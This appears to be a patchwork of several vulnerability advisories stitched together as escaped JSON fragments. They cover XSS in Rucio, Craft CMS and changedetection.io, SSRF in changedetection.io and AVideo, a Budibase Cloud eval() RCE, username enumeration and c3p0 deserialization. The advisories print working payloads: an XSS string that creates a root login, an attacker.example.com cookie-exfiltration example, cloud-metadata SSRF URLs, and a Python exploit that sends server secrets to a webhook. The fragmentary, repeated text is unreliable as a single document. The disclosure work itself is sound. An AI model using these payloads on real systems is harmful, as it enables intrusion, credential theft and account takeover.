This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.\n\n---\n### Details\nSeveral metadata fields accept arbitrary input which is stored and later rendered unsafely in the WebUI when the RSEs are listed in the RSE Management dashboard.\n\n**Create Path**:  \nAdmin > RSE Management\n\n**Trigger Paths**:  \nAdmin > RSE Management  \nAdmin > RSE Management > _RSE NAME_\n\n**Vulnerable Attributes**:  \nCity, Country_Name, ISP\n\n**Request**\n```http\nPOST /proxy/rses/XSSTEST HTTP/1.1\n...\n{\"city\":\"<script>alert('CITY XSS')</script>\",\"country_name\":\"<script>alert('COUNTRY XSS')</script>\",\"ISP\":\"<script>alert('ISP XSS')</script>\",\"deterministic\":false,\"volatile\":false,\"staging_area\":false}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n...\nCreated\n```\n\n**Stored XSS payload triggering in RSE listing after adding XSS payload in metadata**\n<img width=\"1252\" height=\"624\" alt=\"Stored XSS payload triggering in RSE listing after adding XSS payload in metadata\" src=\"https://github.com/user-attachments/assets/6546fc95-0c81-4db7-9271-37b5d4bc8f47\" />\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\nAttackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload to Create Root UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n- Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",

In **Default Values** section, add a row with the following payload:\n    ```html\n    <img src=x onerror=\"alert('XSS')\">\n    ```\n1. Enable `Static Rows`\n1. Use the field in any object (e.g., user profile fields) → then visit any user’s profile\n1. Notice the XSS execution\n\n## Resources\n\nhttps://github.com/craftcms/cms/commit/7b372de262b8d9d2ce859f32780c3715719b6f5a",

An authenticated user (or any user when no password is configured, which is the default) can add a watch for internal network URLs such as:\n\n- `http://169.254.169.254`\n- `http://10.0.0.1/`\n- `http://127.0.0.1/`\n\nThe application fetches these URLs server-side, stores the response content, and makes it viewable through the web UI — enabling full data exfiltration from internal services.\n\nThis is particularly severe because:\n\n- The fetched content is stored and viewable - this is not a blind SSRF\n- Watches are fetched periodically - creating a persistent SSRF that continuously accesses internal resources\n- By default, no password is set - the web UI is accessible without authentication\n- Self-hosted deployments typically run on cloud infrastructure where `169.254.169.254` returns real IAM credentials\n\n---\n\n## Details\n\nThe URL validation function `is_safe_valid_url()` in `changedetectionio/validate_url.py` (lines 60–122) validates the URL protocol (http/https/ftp) and format using the `validators` library, but does not perform any DNS resolution or IP address validation:\n\n```python\n# changedetectionio/validate_url.py:60-122\n@lru_cache(maxsize=1000)\ndef is_safe_valid_url(test_url):\n\n    safe_protocol_regex = '^(http|https|ftp):'\n\n    # Check protocol\n    pattern = re.compile(os.getenv('SAFE_PROTOCOL_REGEX', safe_protocol_regex), re.IGNORECASE)\n    if not pattern.match(test_url.strip()):\n        return False\n\n    # Check URL format\n    if not validators.url(test_url, simple_host=True):\n        return False\n\n    return True  # No IP address validation performed\n```\n\nThe HTTP fetcher in `changedetectionio/content_fetchers/requests.py` (lines 83–89) then makes the request without any additional IP validation:\n\n```python\n# changedetectionio/content_fetchers/requests.py:83-89\nr = session.request(method=request_method,\n                    url=url,            # User-provided URL, no IP validation\n                    headers=request_headers,\n                    timeout=timeout,\n                    proxies=proxies,\n                    verify=False)\n```\nThe response content is stored and made available to the user:\n\n```python\n# changedetectionio/content_fetchers/requests.py:140-142\nself.content = r.text     # Text content stored\nself.raw_content = r.content  # Raw bytes stored\n```\nThis validation gap exists in all entry points that accept watch URLs:\n\n- Web UI: `changedetectionio/store/__init__.py:718`\n- REST API: `changedetectionio/api/watch.py:163, 428`\n- Import API: `changedetectionio/api/import.py:188`\n\nAll use the same `is_safe_valid_url()` function, so a single fix addresses all paths.\n\n---\n\n## PoC\n\n### Prerequisites\n\n- A changedetection.io instance (Docker deployment)\n- Network access to the instance (default port 5000)\n\n### Step 1: Deploy changedetection.io with an internal service\n\nCreate `internal-service.py`:\n```python\n#!/usr/bin/env python3\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({\n            'Code': 'Success',\n            'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',\n            'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',\n            'Token': 'FwoGZXIvYXdzEBYaDExampleSessionToken'\n        }).encode())\nHTTPServer(('0.0.0.0', 80), H).serve_forever()\n```\n\nCreate `Dockerfile.internal`:\n```\nFROM python:3.11-slim\nCOPY internal-service.py /server.py\nCMD [\"python3\", \"/server.py\"]\n```\n\nCreate `docker-compose.yml`:\n```yaml\nversion: \"3.8\"\nservices:\n  changedetection:\n    image: ghcr.io/dgtlmoon/changedetection.io\n    ports:\n      - \"5000:5000\"\n    volumes:\n      - ./datastore:/datastore\n\n  internal-service:\n    build:\n      context: .\n      dockerfile: Dockerfile.internal\n```\n\nStart the stack:\n\n```bash\ndocker compose up -d\n```\n\n### Step 2: Add a watch for the internal service\n\nOpen `http://localhost:5000/` in a browser (no password required by default).\n\nIn the URL field, enter:\n```\nhttp://internal-service/\n```\nClick **Watch** and wait for the first check to complete.\n\n### Step 3: View the exfiltrated data\n\nClick on the watch entry, then click **Preview**. The page displays the internal service’s response containing the simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n<img width=\"2291\" height=\"780\" alt=\"Screenshot 2026-02-16 084212\" src=\"https://github.com/user-attachments/assets/115b69fb-ea10-4c47-a38c-409ede0e03cd\" />\n\n### Step 4: Verify via API (alternative)\n```bash\n# Get the API key (visible in Settings page of the unauthenticated web UI)\nAPI_KEY=$(docker compose exec changedetection cat /datastore/url-watches.json | \\\n  python3 -c \"import sys,json; print(json.load(sys.stdin)['settings']['application']['api_access_token'])\")\n\n# Create a watch via API\nWATCH_RESPONSE=$(curl -s -X POST \"http://localhost:5000/api/v1/watch\" \\\n  -H \"x-api-key: $API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://internal-service/\"}')\n\nWATCH_UUID=$(echo \"$WATCH_RESPONSE\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['uuid'])\")\necho \"Watch created: $WATCH_UUID\"\n\n# Wait for the first fetch to complete\necho \"Waiting 30s for first fetch...\"\nsleep 30\n\n# Retrieve the exfiltrated data via API\nLATEST_TS=$(curl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history\" \\\n  -H \"x-api-key: $API_KEY\" | \\\n  python3 -c \"import sys,json; h=json.load(sys.stdin); print(sorted(h.keys())[-1]) if h else print('')\")\n\necho \"=== EXFILTRATED DATA ===\"\ncurl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history/$LATEST_TS\" \\\n  -H \"x-api-key: $API_KEY\"\n```\nExpected output — the internal service’s response containing simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n\nIn a real cloud deployment, replacing `http://internal-service/` with:\n\n```bash\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\nwould return real AWS IAM credentials.\n\n<img width=\"1140\" height=\"607\" alt=\"Screenshot 2026-02-16 084407\" src=\"https://github.com/user-attachments/assets/cb1f5c02-6604-49e6-9e26-13406b190b45\" />\n\n---\n\n## Impact\n\n**Who is impacted:**  \nAll self-hosted changedetection.io deployments, particularly those running on cloud infrastructure (AWS, GCP, Azure) where the instance metadata service at `169.254.169.254` is accessible.\n\n**What an attacker can do:**\n\n- **Steal cloud credentials:** Access the cloud metadata endpoint to obtain IAM credentials, service account tokens, or managed identity tokens\n- **Scan internal networks:** Discover internal services by adding watches for internal IP ranges and observing responses\n- **Access internal services:** Read data from internal APIs, databases, and admin interfaces that are not exposed to the internet\n- **Persistent access:** Watches are fetched periodically on a configurable schedule, providing continuous access to internal resources\n- **No authentication required by default:** The web UI has no password set by default, allowing any user with network access to exploit this vulnerability\n\n---\n\n### Suggested Remediation\n\nAdd IP address validation to `is_safe_valid_url()` in `changedetectionio/validate_url.py`:\n\n```python\nimport ipaddress\nimport socket\n\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),     # Loopback\n    ipaddress.ip_network('10.0.0.0/8'),      # Private (RFC 1918)\n    ipaddress.ip_network('172.16.0.0/12'),   # Private (RFC 1918)\n    ipaddress.ip_network('192.168.0.0/16'),  # Private (RFC 1918)\n    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / Cloud metadata\n    ipaddress.ip_network('::1/128'),         # IPv6 loopback\n    ipaddress.ip_network('fc00::/7'),        # IPv6 unique local\n    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local\n]\n\ndef is_private_ip(hostname):\n    \"\"\"Check if a hostname resolves to a private/reserved IP address.\"\"\"\n    try:\n        for info in socket.getaddrinfo(hostname, None):\n            ip = ipaddress.ip_address(info[4][0])\n            for network in BLOCKED_NETWORKS:\n                if ip in network:\n                    return True\n    except socket.gaierror:\n        return True  # Block unresolvable hostnames\n    return False\n```\n\nThen add to `is_safe_valid_url()` before the final `return True`:\n\n```python\n# Check for private/reserved IP addresses\nparsed = urlparse(test_url)\nif parsed.hostname and is_private_ip(parsed.hostname):\n    logger.warning(f\"URL '{test_url}' resolves to a private/reserved IP address\")\n    return False\n```\n\nAn environment variable (e.g., `ALLOW_PRIVATE_IPS=true`) could be provided for users who intentionally need to monitor internal services.",

All vulnerabilities were confirmed exploitable on the latest version (0.53.6) it was additionally validated at scale against 500 internet-facing instances discovered via FOFA search engine, producing 5K+ confirmed detections using a custom Nuclei template, demonstrating widespread real-world impact.\nThe RSS single-watch endpoint reflects the UUID path parameter directly in the HTTP response body without HTML escaping. Since Flask returns text/html by default for plain string responses, the browser parses and executes injected JavaScript.\n\n### Details\nFile: `changedetectionio/blueprint/rss/single_watch.py (lines ~45 and ~50)`\n\nThe UUID parameter from the URL path is interpolated into the response body using an f-string with no escaping:\n\n### Line ~45\n```\nwatch = datastore.data['watching'].get(uuid)\nif not watch:\n    return f\"Watch with UUID {uuid} not found\", 404  # ← No escaping, Content-Type: text/html\n```\n\n### Line ~50\n```\nif len(dates) < 2:\n    return f\"Watch {uuid} does not have enough history snapshots...\", 400  # ← Same issue\nFlask's default Content-Type for plain string responses is text/html; charset=utf-8, so any HTML/JavaScript in {uuid} is rendered by the browser.\n```\n\n## Attack Vector\nThe attack requires a valid RSS access token, which is a 32-character hex string exposed in the HTML <link> tag on the homepage without authentication:\n\n<!-- Visible in page source of any unauthenticated instance -->\n<link rel=\"alternate\" type=\"application/rss+xml\" href=\"/rss?token=f2bb14e20ff01bad83a743cf21b5df95\">\n\nAttacker visits the target's homepage if it unauthenticathed and extracts the RSS token from the <link> tag\nCrafts a malicious URL:\n\n1. http://target:5000/rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=EXTRACTED_TOKEN\n2. Sends the link to a victim who has an active session on the [changedetection.io](http://changedetection.io/) instance\n3. When the victim clicks the link, the server responds with:\n4. Watch with UUID not found\n\nThe browser renders the <img> tag, the onerror fires, and JavaScript executes in the victim's session context\n\n### PoC\nRequest:\n\n```\nGET /rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=223e7edbbfee2268f5abb5344919054e HTTP/1.1\nHost: [127.0.0.1:5000](http://127.0.0.1:5000/)\n```\n\nResponse:\n\n```\nHTTP/1.1 404 NOT FOUND\nContent-Type: text/html; charset=utf-8\n```\n\nWatch with UUID not found\n\n\n<img width=\"1918\" height=\"1032\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1633b167-e4ec-4705-a110-18fad7826fc9\" />\n\nThe XSS payload is reflected unescaped in an HTML response. The browser executes alert(document.cookie).\n\nLots of intances over internet affected to this.\n<img width=\"1465\" height=\"721\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f54160d4-abd1-4e8d-b845-f85e53e79325\" />\n\n\n### Impact\n- Session cookie theft via document.cookie exfiltration\n- Account takeover if session cookies lack HttpOnly flag\n- Phishing via crafted links that appear to originate from a trusted [changedetection.io](http://changedetection.io/) instance\n- Token is obtainable without authentication from the homepage <link> tag, lowering the barrier to exploitation\n\nchangedetection.io can work with developer teams to validate and address these issues.

Read-only users are given the full master key instead of the read-only master key and can supply write permissions in the request body to perform write and delete operations.\n\nAffected are only dashboards with `agent` configuration enabled.\n\n### Patches\n\nThe fix adds per-app authorization checks and restricts read-only users to the `readOnlyMasterKey` with write permissions stripped server-side.\n\n### Workarounds\n\nRemove the `agent` configuration block from your dashboard configuration.

Depending on the affected feature, this may impact all users or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\nAttackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload to Create Root UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n- Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",

          "html": "## Summary\n\nA critical unsafe `eval()` vulnerability in Budibase's view filtering implementation allows any authenticated user (including free tier accounts) to execute arbitrary JavaScript code on the server. **This vulnerability ONLY affects Budibase Cloud (SaaS)** - self-hosted deployments use native CouchDB views and are not vulnerable. The vulnerability exists in `packages/server/src/db/inMemoryView.ts` where user-controlled view map functions are directly evaluated without sanitization.\n\nThe primary impact comes from what lives inside the pod's environment: the `app-service` pod runs with **secrets baked into its environment variables**, including `INTERNAL_API_KEY`, `JWT_SECRET`, CouchDB admin credentials, AWS keys, and more. Using the extracted CouchDB credentials, we verified direct database access, enumerated all tenant databases, and confirmed that user records (email addresses) are readable.\n\n## Details\n\n### Root Cause\n\nFile: `packages/server/src/db/inMemoryView.ts:28`\n\n```javascript\nexport async function runView(\n  view: DBView,\n  calculation: string,\n  group: boolean,\n  data: Row[]\n) {\n  // ...\n  let fn = (doc: Document, emit: any) => emit(doc._id)\n  // BUDI-7060 -> indirect eval call appears to cause issues in cloud\n  eval(\"fn = \" + view?.map?.replace(\"function (doc)\", \"function (doc, emit)\"))  // UNSAFE EVAL\n  // ...\n}\n```\n\n**Why Only Cloud is Vulnerable:**\n\nFile: `packages/server/src/sdk/workspace/rows/search/internal/internal.ts:194-221`\n\n```typescript\nif (env.SELF_HOSTED) {\n  // Self-hosted: Uses native CouchDB design documents - NO EVAL\n  response = await db.query(`database/${viewName}`, {\n    include_docs: !calculation,\n    group: !!group,\n  })\n} else {\n  // Cloud: Uses in-memory PouchDB with UNSAFE EVAL\n  const tableId = viewInfo.meta!.tableId\n  const data = await fetchRaw(tableId!)\n  response = await inMemoryViews.runView(  // <- Calls vulnerable function\n    viewInfo,\n    calculation as string,\n    !!group,\n    data\n  )\n}\n```\n\nThe `view.map` parameter comes directly from user input when creating table views with filters. The code constructs a string by concatenating `\"fn = \"` with the user-controlled map function and passes it to `eval()`, allowing arbitrary JavaScript execution in the Node.js server context.\n\n**Self-hosted deployments are not affected** because they use native CouchDB design documents instead of the in-memory eval() path.\n\n### Attack Flow\n\n1. Authenticated user creates a table view with custom filter\n2. Frontend sends POST request to `/api/views` with malicious payload in filter value\n3. Backend stores view configuration in CouchDB\n4. When view is queried (GET `/api/views/{viewName}`), `runView()` is called\n5. Malicious code is `eval()`'d on server - RCE achieved\n\n### Exploitation Vector\n\nThe vulnerability is triggered via the view filter mechanism. When creating a view with a filter condition, the filter value can be injected with JavaScript code that breaks out of the intended expression context:\n\n**Malicious filter value:**\n```javascript\nx\" || (MALICIOUS_CODE_HERE, true) || \"\n```\n\nThis payload:\n- Closes the expected string context with `x\"`\n- Uses `||` (OR operator) to inject arbitrary code\n- Returns `true` to make the filter always match\n- Closes with `|| \"\"` to maintain valid syntax\n\n### Verified on Production\n\nTested on own Budibase Cloud account (y4ylfy7m.budibase.app,) to confirm severity. Testing was deliberately limited - no customer data was retained and exploitation was stopped once impact was confirmed:\n- Achieved RCE on `app-service` pod (hostname: `app-service-5f4f6d796d-p6dhz`, Kubernetes, `eu-west-1`)\n- Extracted `process.env` - confirmed presence of platform secrets (`JWT_SECRET`, `INTERNAL_API_KEY`, `COUCH_DB_URL`, `MINIO_ACCESS_KEY`, etc.)\n- Used extracted `COUCH_DB_URL` credentials to verify CouchDB access - enumerated database list (489,827 databases) to confirm scale of impact\n- Queried users table to confirm data is readable (retrieved email addresses)\n- Uploaded an HTML file as a PoC artifact to confirm write access.\n\n\n\n\n\n## Proof of Concept\n\n### PoC Script\n\n```python\nimport requests, time\nfrom urllib.parse import urlparse\n\n# Config | CHANGE THESE\nURL = \"https://[YOUR-TENANT].budibase.app\"\nWEBHOOK = \"https://webhook.site/[YOUR-WEBHOOK-ID]\"\nJWT = \"[YOUR-JWT-TOKEN]\"          # budibase:auth cookie value\nAPP_ID = \"app_dev_[TENANT]_[APP-UUID]\"  # x-budibase-app-id header\nTABLE_ID = \"[YOUR-TABLE-ID]\"      # any table ID (e.g. ta_users)\n\n# Payload - parses hostname/path from WEBHOOK automatically\nwebhook_parsed = urlparse(WEBHOOK)\nview = f\"RCE_{int(time.time())}\"\npayload = f'''x\" || (require('https').request({{hostname:'{webhook_parsed.hostname}',path:'{webhook_parsed.path}',method:'POST'}}).end(JSON.stringify(process.env)), true) || \"'''\n\n# Exploit\ns = requests.Session()\ns.cookies.set('budibase:auth', JWT)\ns.headers.update({\"x-budibase-app-id\": APP_ID, \"Content-Type\": \"application/json\"})\n\nprint(f\"[*] Creating view...\")\ns.post(f\"{URL}/api/views\", json={\"tableId\": TABLE_ID, \"name\": view, \"filters\": [{\"key\": \"email\", \"condition\": \"EQUALS\", \"value\": payload}]})\n\nprint(f\"[*] Triggering RCE...\")\ns.get(f\"{URL}/api/views/{view}\")\n\nprint(f\"[+] Done! Check: {WEBHOOK}\")\n```\n\n### Video Demo\nhttps://github.com/user-attachments/assets/cd12e1ab-02fd-4d0d-9fb5-d78bb83cdf99\n\n\n### Reproduction Steps\n\n1. **Prerequisites:**\n   - Create free Budibase Cloud account at https://budibase.app\n   - Create a new app\n   - Create a table with at least one text field\n\n2. **Exploitation:**\n   - Copy the PoC script above\n   - Replace placeholders with your tenant URL, app ID, table ID\n   - Get your JWT token from browser cookies (`budibase:auth`)\n   - Create a webhook at https://webhook.site for exfiltration\n   - Run the script: `python3 budibase_rce_poc.py`\n\n3. **Verification:**\n   - Check webhook.site - you'll receive all server environment variables\n   - Extracted data includes JWT_SECRET, INTERNAL_API_KEY, database credentials\n\n## Additional Note\n\nThe `budibase:auth` session cookie has `Domain=.budibase.app` (leading dot = all subdomains) and no `HttpOnly` flag, making it readable by JavaScript. Since the RCE allows uploading arbitrary HTML files to any subdomain (as demonstrated with the PoC artifact), an attacker could serve an XSS payload from their own tenant subdomain and steal session cookies from any Budibase Cloud user who visits that page (one click ATO).\n\n## Responsible Disclosure Statement\n\nThis vulnerability was discovered during independent security research. Testing was conducted on a personal free-tier account only. Exploitation was deliberately limited to what was necessary to confirm the vulnerability and its impact:\n\n- No customer data was accessed beyond enumerating database names and confirming that user records (email addresses) are readable\n- The PoC HTML file uploaded to confirm write access is benign\n- This report is being submitted directly to Budibase security with no plans for public disclosure until a fix is in place\n- **Before any public disclosure, this report must be redacted/simplified** - all credentials, hostnames, internal API keys, tenant IDs, and other sensitive platform details included here for Budibase's remediation purposes must be removed or redacted",

This allows authenticated users to trigger server-side requests to arbitrary URLs (including internal network endpoints).\n\n### Impact Summary\nAn authenticated attacker can leverage SSRF to interact with internal services and retrieve sensitive data (e.g., internal APIs, metadata services), potentially leading to further compromise depending on the deployment environment.\n\n### Resolution/Fix\nThis issue has been fixed in AVideo version 22. Users should upgrade to version 22.0 as soon as possible.\n\n### Credits/Acknowledgement\nThanks to Arkadiusz Marta for responsibly reporting this issue.\n- GitHub Profile: https://github.com/arkmarta/",

A non-existent username results in an error indicating that no account is associated with the identity, while an existing username with an incorrect password produces a different authentication-related error.\n\nThis behavioral difference allows an attacker to distinguish valid usernames from invalid ones by observing the response content.\n\n### Proof of Concept\n**Bogus Login (Non-existent Username \"15251087\")**  \nResponse contains:\n```\nCannot get find any account associated with 15251087 identity.\n```\n\n**Bogus Login (Existing Username \"root\", Wrong Password)**  \nResponse contains:\n```\nCannot get auth token. It is possible that the presented identity root is not mapped to any Rucio account root.\n```\n\nThe difference in error messages confirms whether a username exists.\n\n### Impact\nAn unauthenticated attacker can enumerate valid usernames, which may be leveraged for targeted password guessing, credential stuffing, or social engineering attacks.\n\n### Remediation / Mitigation\nReturn a generic authentication failure message for all login errors, regardless of whether the username exists. Avoid disclosing account or identity existence through error responses. Consider implementing rate limiting or additional login throttling to further reduce abuse.\n\n#### Reources:\n- OWASP Authentication Cheat Sheet -  Authentication and Error Messages: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages",

The WebUI client then injects that text into the DOM using unsafe methods (examples in `lib/rucio/web/ui/static/*.js` such as `rule.js`, `request_rule.js`, `list_rules.js`) with `jQuery.html(...)` or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).\n\n### PoC\n1) Reflected XSS via account parameter (browse or load URL in WebUI context):\n```text\nhttps://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\n```\nServer response (excerpt):\n```http\nHTTP/1.1 500 INTERNAL SERVER ERROR\nExceptionClass: AccountNotFound\nExceptionMessage: Account <img src=x onerror=alert(document.cookie)> does not exist\nContent-Type: application/octet-stream\n\n{\"ExceptionClass\":\"AccountNotFound\",\"ExceptionMessage\":\"Account <img src=x onerror=alert(document.cookie)> does not exist\"}\n```\n\n**XSS payload triggering (Displaying session token) when browsing to crafted URL**\n<img width=\"1210\" height=\"510\" alt=\"XSS payload triggering (Displaying session token) when browsing to crafted URL\" src=\"https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6\" />\n\nWhen the WebUI inserts `ExceptionMessage` into the page with `.html(...)`, the injected <img onerror=...> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\n2) Reflected XSS via account key attribute creation error:\n```http\nPOST /proxy/accounts/pentest/attr/XSS HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nOrigin: https://127.0.0.1:8443\nX-Rucio-Script: webui::-ui-account\n{\"key\":\"XSS\",\"value\":\"<script>alert(document.cookie)</script>\"}\n```\n\n**XSS payload triggering (Displaying session token) on error when creating account key**\n<img width=\"1322\" height=\"593\" alt=\"XSS payload triggering (Displaying session token) on error when creating account key\" src=\"https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72\" />\n\nServer response (excerpt) contains `ExceptionMessage` with the raw `<script>` payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.\n\n### Impact\nAny authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.\n\nAttackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. \n\n**Example URL to Create UserPass for Root**\n```\nhttps://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E\n```\n\n**Account Payload to Create UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n```\n\n**Creating identity for Root account via reflected XSS**\n<img width=\"1558\" height=\"957\" alt=\"Creating identity for Root account via reflected XSS\" src=\"https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44\" />\n\nAll WebUI users are impacted.\n\n### Remediation / Mitigation\nChange all client-side insertions of server-provided text from `.html(...)` to `.text()` or create text nodes / escape HTML before insertion. Example: replace `$('#elem').html(msg)` with `$('#elem').empty().append($('<span>').text(msg))`.\n\nAdditionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.\n\n> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n#### References:\n- Server functions: `common.py` (`error_headers`, `_error_response, generate_http_error_flask`)\n- Example client files to fix: `lib/rucio/web/ui/static/rule.js`, `lib/rucio/web/ui/static/request_rule.js, list_rules.js`\n- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",

Several c3p0 `ConnectionPoolDataSource` implementations have a property called `userOverridesAsString` which conceptually represents a `Map<String,Map<String,String>>`. Prior to v0.12.0, that property was maintained as a hex-encoded serialized object. Any attacker able to reset this property, on an existing `ConnectionPoolDataSource` or via maliciously crafted serialized objects or `javax.naming.Reference` instances could be tailored execute unexpected code on the application's `CLASSPATH`.\n\nThe danger of this vulnerability was strongly magnified by vulnerabilities in c3p0's main dependency, mchange-commons-java. This library includes code that mirrors early implementations of JNDI functionality, including ungated support for remote `factoryClassLocation` values. Attackers could set c3p0's `userOverridesAsString` hex-encoded serialized objects that include objects \"indirectly serialized\" via JNDI references. Deserialization of those objects and dereferencing of the embedded `javax.naming.Reference` objects could provoke download and execution of malicious code from a remote `factoryClassLocation`.\n\nAlthough hazard presented by c3p0's vulnerabilites are exarcerbated by 